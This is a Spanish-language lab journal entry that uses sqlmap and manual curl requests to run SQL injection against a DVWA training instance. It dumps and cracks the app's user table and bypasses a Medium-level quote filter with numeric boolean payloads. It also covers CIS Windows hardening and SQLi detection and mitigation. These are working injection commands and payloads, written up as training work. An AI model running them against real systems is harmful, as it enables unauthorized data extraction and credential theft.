# Día 24 — SQLmap Avanzado + SQLi Blind Medium + Timestamp + CIS Hardening

**Fecha:** Abril 2026  
**MITRE:** T1190, T1059  
**DVWA:** SQL Injection (Low) + SQLi Blind (Medium)

---

## Teoría

### SQLmap Avanzado
SQLmap es una herramienta de automatización de SQL Injection que detecta vulnerabilidades, identifica el DBMS, enumera bases de datos, tablas y columnas, extrae datos y puede crackear hashes automáticamente. Guarda resultados en sesión para no repetir trabajo en ejecuciones posteriores.

### SQLi Blind Medium
En nivel Low el parámetro `id` era GET y permitía comillas simples. En nivel Medium el formulario es un dropdown (POST) y el filtro elimina comillas simples. El bypass consiste en usar payloads numéricos sin comillas — la condición booleana funciona igual sin necesidad de cerrar strings.

---

## Red Team

### Sección 1 — SQLmap: Enumerar bases de datos

```bash
sqlmap -u "http://192.168.1.96:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session>; security=low" \
  --dbs \
  --batch
```

**Técnicas de inyección detectadas:**

| Técnica | Descripción |
|---------|-------------|
| Boolean-based blind | Preguntas verdadero/falso — respuesta diferente según condición |
| Error-based | Provoca errores MySQL que contienen los datos |
| Time-based blind | SLEEP(5) — deduce información por tiempo de respuesta |
| UNION query | Agrega segunda consulta — devuelve datos directamente |

**Bases de datos encontradas:**
- `dvwa` — aplicación principal
- `information_schema` — metadata interna de MySQL

### Sección 2 — SQLmap: Volcar tabla users

```bash
sqlmap -u "http://192.168.1.96:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session>; security=low" \
  -D dvwa -T users \
  --dump \
  --batch
```

**Resultado — 5 usuarios con contraseñas crackeadas:**

| Usuario | Hash MD5 | Contraseña |
|---------|----------|-----------|
| admin | 5f4dcc3b... | password |
| gordonb | e99a18c4... | abc123 |
| 1337 | 8d3533d7... | charley |
| pablo | 0d107d09... | letmein |
| smithy | 5f4dcc3b... | password |

SQLmap crackeó los hashes automáticamente con su diccionario interno en menos de 30 segundos. Resultados guardados en `/home/d2/.local/share/sqlmap/output/192.168.1.96/dump/dvwa/users.csv`.

### Sección 3 — SQLi Blind Medium

El formulario de Medium usa dropdown (POST) — no hay campo de texto libre desde el frontend. Sin embargo el backend no valida el origen del request — es bypasseable desde CLI.

**Filtro activo:** elimina comillas simples del parámetro `id`.

**Confirmación del filtro:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/sqli_blind/" \
  -b "PHPSESSID=<session>; security=medium" \
  -X POST \
  -d "id=1' AND 1=1#&Submit=Submit" | grep -i "exists\|missing"
# → User ID is MISSING — comilla simple bloqueada
```

**Bypass — payload numérico sin comillas:**
```bash
# Condición verdadera
curl -s "..." -d "id=1 AND 1=1&Submit=Submit" | grep -i "exists"
# → User ID exists in the database.

# Condición falsa
curl -s "..." -d "id=1 AND 1=2&Submit=Submit" | grep -i "missing"
# → User ID is MISSING from the database.
```

**Automatización con SQLmap:**
```bash
sqlmap -u "http://192.168.1.96:8080/vulnerabilities/sqli_blind/" \
  --cookie="PHPSESSID=<session>; security=medium" \
  --data="id=1&Submit=Submit" \
  --technique=B \
  -D dvwa -T users \
  --dump \
  --batch
```

SQLmap usó resultados cacheados de la sesión anterior — completó en 1 segundo.

**Diferencia Low vs Medium:**

| | Low | Medium |
|--|--|--|
| Método | GET | POST |
| Input | Campo de texto | Dropdown |
| Comillas | Permitidas | Bloqueadas |
| Bypass | `1' AND 1=1#` | `1 AND 1=1` |
| SQLmap flag | `-u "...?id=1"` | `--data="id=1"` |

---

## App MS Security — Timestamp de Último Refresh

Se agregó un timestamp que muestra la hora del último refresh de alertas Wazuh.

```jsx
const [lastRefresh, setLastRefresh] = useState(null)

const fetchWazuhAlerts = () => {
  fetch("http://localhost:5000/wazuh/alerts")
    .then(res => res.json())
    .then(data => {
      setWazuhAlerts(data.alerts || [])
      setLastRefresh(new Date().toLocaleTimeString())
    })
}
```

El indicador `↻ 30s` fue reemplazado por `↻ HH:MM:SS` — hora exacta del último refresh. Se actualiza automáticamente cada 30 segundos.

---

## Wazuh — CIS Hardening

Score al inicio: **38%** (181 passed / 293 failed)

### Grupo 1 — Auditoría (9 subcategorías)

```powershell
auditpol /set /subcategory:"Validación de credenciales" /success:enable /failure:enable
auditpol /set /subcategory:"Administración de grupos de seguridad" /success:enable /failure:enable
auditpol /set /subcategory:"Administración de cuentas de usuario" /success:enable /failure:enable
auditpol /set /subcategory:"Creación del proceso" /success:enable
auditpol /set /subcategory:"Bloqueo de cuenta" /failure:enable
auditpol /set /subcategory:"Pertenencia a grupos" /success:enable
auditpol /set /subcategory:"Cerrar sesión" /success:enable
auditpol /set /subcategory:"Inicio de sesión" /success:enable /failure:enable
auditpol /set /subcategory:"Inicio de sesión especial" /success:enable
```

### Grupo 2 — Cortana, búsqueda y AutoRun

```powershell
# Cortana deshabilitada
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -Name "AllowCortana" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -Name "AllowCortanaAboveLock" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -Name "AllowSearchToUseLocation" -Value 0

# AutoRun y AutoPlay deshabilitados
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer" -Name "NoAutoplayfornonVolume" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoDriveTypeAutoRun" -Value 255
```

### Grupo 3 — Telemetría y diagnóstico

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Name "AllowTelemetry" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Name "DisableOneSettingsDownloads" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Name "LimitDiagnosticLogCollection" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Name "LimitDumpCollection" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Name "DoNotShowFeedbackNotifications" -Value 1
```

Telemetría completamente deshabilitada — Windows no envía datos de diagnóstico a Microsoft.

### Grupo 4 — Red y componentes

```powershell
# LLMNR multicast deshabilitado — previene ataques de envenenamiento de nombre
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0

# Font Providers deshabilitado — elimina conexiones salientes innecesarias
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableFontProviders" -Value 0

# Internet Connection Sharing bloqueado
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Internet Connection Sharing" -Force | Out-Null
```

**LLMNR** es especialmente importante — es el protocolo abusado en ataques de Responder para capturar hashes NTLM en redes locales.

### Grupo 5 — PowerShell y Windows Defender

```powershell
# PowerShell Transcription — registra todos los comandos ejecutados
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1

# Defender — escaneo de USBs y correo
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" -Name "DisableRemovableDriveScanning" -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" -Name "DisableEmailScanning" -Value 0

# PUA Detection habilitado
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine" -Name "MpEnablePus" -Value 1
```

---

## Blue Team

### Detección SQLi
- Wazuh con agente en Ubuntu detectaría queries maliciosas en logs de Apache
- Múltiples requests con payloads de SQLi en poco tiempo — patrón de SQLmap
- IDS/WAF con reglas de SQLi detectaría `UNION SELECT`, `SLEEP()`, `AND 1=1`

### Mitigación SQLi
- Prepared statements / queries parametrizadas — nunca concatenar input del usuario
- Principio de mínimo privilegio en DB — el usuario de la app no debe tener acceso a `information_schema`
- WAF con reglas de SQLi

---

## Conclusión

SQLmap automatizó completamente la cadena de ataque — detección, enumeración, extracción y cracking de hashes en un solo comando. SQLi Blind Medium demostró que el filtro de comillas simples es bypasseable con payloads numéricos — la defensa correcta son prepared statements, no filtros de caracteres. El timestamp de refresh convierte el dashboard en una herramienta de monitoreo más profesional. El hardening cubrió auditoría, Cortana, AutoRun, telemetría, LLMNR y PowerShell Transcription — acercándonos al objetivo de 40% CIS.
